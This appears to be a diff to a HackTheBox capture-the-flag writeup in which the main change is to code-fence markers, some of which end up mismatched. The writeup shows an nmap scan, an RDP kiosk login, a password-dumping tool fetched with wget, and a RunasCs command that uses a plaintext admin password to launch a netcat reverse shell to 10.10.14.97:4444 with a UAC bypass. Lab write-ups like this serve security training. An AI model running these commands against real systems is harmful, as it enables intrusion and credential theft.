@@ -5,7 +5,7 @@ categories: [HackTheBox Writeups]
 tags: [hackthebox, windows]
 ---
 
-```
+```bash
 ares@legion:~$ sudo nmap -sVC -A -T4 $target
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-21 06:39 EST
 Stats: 0:00:16 elapsed; 0 hosts completed (1 up), 1 undergoing Traceroute
@@ -47,11 +47,10 @@ HOP RTT      ADDRESS
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 22.17 seconds
-```
-
+```bash
 ```
 xfreerdp3 /v:10.129.234.51 /sec:tls /dynamic-resolution +clipboard /cert:ignore
-```
+```bash
 ![20251121135233.png](/assets/img/htb-writeups/Pasted image 20251121135233.png)
 
 KioskUser0
@@ -69,7 +68,7 @@ Import .xml profile in rdp app > failed
 wget http://10.10.14.97:8000/BulletsPassView.exe -O BPV.exe
 
 .\BPV.exe
-```
+```bash
 ![20251121143314.png](/assets/img/htb-writeups/Pasted image 20251121143314.png)
 
 Download and move to windows: 
@@ -77,8 +76,7 @@ RunasCs.exe
 nc64.exe
 ```
 .\RunasCs.exe admin Twisting3021 "C:\temp\nc64.exe 10.10.14.97 4444 -e cmd.exe" --bypass-uac --logon-type 8
-```
-
+```bash
 nc -nvlp 4444
 ![20251121150938.png](/assets/img/htb-writeups/Pasted image 20251121150938.png)
 
